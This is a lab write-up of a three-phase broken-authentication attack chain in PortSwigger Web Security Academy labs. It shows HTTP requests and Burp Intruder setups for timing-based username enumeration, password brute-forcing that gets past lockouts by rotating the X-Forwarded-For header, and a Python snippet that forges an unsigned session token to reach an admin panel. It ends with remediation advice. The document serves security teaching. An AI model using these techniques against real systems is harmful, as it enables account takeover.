# 🔐 Technical Writeup: Broken Authentication Attack Chain
**Lab Platform:** PortSwigger Web Security Academy  
**Vulnerability Class:** Broken Authentication  
**OWASP:** A07:2021 — Identification and Authentication Failures  
**Tools Used:** Burp Suite Pro, Burp Intruder, Burp Repeater  
**Author:** Atanu Pal | [LinkedIn](https://linkedin.com/in/atanu-palcybersecurity)

---

## Executive Summary

This writeup documents a full broken authentication attack chain executed across multiple PortSwigger Web Security Academy labs. The chain demonstrates how three distinct weaknesses — username enumeration via response timing, credential brute-force via Burp Intruder, and session token prediction — can be chained together to achieve complete account takeover without prior knowledge of valid credentials.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Brute Force: Credential Stuffing | T1110.004 | Automated credential attempts |
| Brute Force: Password Guessing | T1110.001 | Targeted password spraying |
| Valid Accounts | T1078 | Using harvested valid credentials |
| Steal Web Session Cookie | T1539 | Session token theft/prediction |

---

## Attack Phase 1 — Username Enumeration via Response Timing

### Concept
Applications often take slightly longer to process requests for **valid** usernames (e.g., to check the password hash) vs invalid ones (where they fail immediately). This microsecond difference is measurable and exploitable.

### Methodology

**Setup:** Burp Suite → Proxy → Intercept login request

```http
POST /login HTTP/1.1
Host: target-lab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=test&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

**Key technique:** Send an extremely long password string. Valid usernames will spend measurable time hashing the long password; invalid usernames return immediately.

**Burp Intruder Config:**
- Attack type: Sniper
- Payload position: `username=§test§`
- Payload list: Common username wordlist (SecLists/usernames/top-usernames-shortlist.txt)
- Add column: Response received time

**Observation:**
```
Username: admin     → Response time: 847ms  ← VALID (hashing the long password)
Username: user      → Response time: 12ms   ← INVALID
Username: carlos    → Response time: 792ms  ← VALID
Username: wiener    → Response time: 831ms  ← VALID
```

### Result
Valid usernames identified: `admin`, `carlos`, `wiener`

---

## Attack Phase 2 — Credential Brute-Force via Burp Intruder

### Concept
With valid usernames confirmed, targeted password spraying is performed against each account using a curated password list.

### Methodology

**Request:**
```http
POST /login HTTP/1.1
Host: target-lab.web-security-academy.net

username=carlos&password=§password123§
```

**Burp Intruder — Pitchfork Attack:**
- Payload Set 1: Confirmed valid usernames
- Payload Set 2: Common password wordlist

**Bypass technique — IP-based rate limiting:**  
The lab implements a lockout after N failed attempts. Bypass by injecting:
```http
X-Forwarded-For: 1.1.1.§1§
```
Rotating this header resets the attempt counter per "IP."

**Response analysis:**
```
HTTP/1.1 302 Found  ← Successful login (redirect to /my-account)
HTTP/1.1 200 OK     ← Failed login (renders login page again)
```

**Filter:** Sort by Status Code → 302 responses = valid credentials

### Result
```
Username: carlos
Password: letmein
→ HTTP 302 → Authenticated
```

---

## Attack Phase 3 — Session Token Prediction

### Concept
Poorly implemented session tokens based on predictable values (timestamp, sequential ID, weak PRNG) can be predicted or forged, allowing an attacker to hijack sessions without credentials.

### Methodology

**Collect sample tokens:**
```
Session 1: eyJ1c2VyIjoiY2FybG9zIiwidGltZSI6MTcwMDAwMDAwMH0=
Session 2: eyJ1c2VyIjoiY2FybG9zIiwidGltZSI6MTcwMDAwMDAwMX0=
Session 3: eyJ1c2VyIjoiY2FybG9zIiwidGltZSI6MTcwMDAwMDAwMn0=
```

**Base64 decode:**
```json
{"user":"carlos","time":1700000000}
{"user":"carlos","time":1700000001}
{"user":"carlos","time":1700000002}
```

**Observation:** Token = Base64({"user":"<username>","time":<unix_timestamp>})  
The token is **not signed** — no HMAC, no secret.

**Forge admin token:**
```python
import base64, json, time

payload = {"user": "administrator", "time": int(time.time())}
token = base64.b64encode(json.dumps(payload).encode()).decode()
print(token)
# eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInRpbWUiOjE3MDAwMDAwMDB9
```

**Inject forged token:**
```http
GET /admin HTTP/1.1
Cookie: session=eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInRpbWUiOjE3MDAwMDAwMDB9
```

### Result
```
HTTP/1.1 200 OK
<h1>Admin Panel</h1>  ← Full admin access achieved
```

---

## Full Attack Chain Summary

```
[Phase 1] Enumerate valid usernames via response timing differential
         ↓
         Valid usernames: carlos, admin, wiener
         ↓
[Phase 2] Brute-force passwords with Burp Intruder (IP rotation bypass)
         ↓
         carlos:letmein authenticated
         ↓
[Phase 3] Analyze session token structure → predict/forge admin token
         ↓
         Admin panel access → Full account takeover
```

---

## Risk Rating

| Finding | CVSS Score | Severity |
|---|---|---|
| Username Enumeration | 5.3 | Medium |
| Credential Brute-Force | 8.1 | High |
| Session Token Prediction | 9.1 | Critical |
| **Chained Attack** | **9.8** | **Critical** |

---

## Remediation

| Issue | Fix |
|---|---|
| Username enumeration | Return identical response time/body for valid & invalid usernames |
| Brute-force | Implement exponential backoff + CAPTCHA after 5 failed attempts; don't rely on IP-based rate limits alone |
| Session prediction | Use cryptographically secure random tokens (e.g., `secrets.token_hex(32)` in Python); sign tokens with HMAC-SHA256 |
| General | Implement MFA; monitor for repeated auth failures via SIEM |

---

## Tools & References

- [Burp Suite Pro](https://portswigger.net/burp)
- [PortSwigger Web Security Academy — Authentication Labs](https://portswigger.net/web-security/authentication)
- [SecLists — Username Wordlists](https://github.com/danielmiessler/SecLists)
- [OWASP Testing Guide — OTG-AUTHN-003](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)

---

**Author:** Atanu Pal — Ethical Hacker | Bug Bounty Hunter | SOC Analyst  
**Contact:** atanupal22256@gmail.com | [GitHub](https://github.com/atanupal22256-dot/cybersecurity-soc-portfolio)
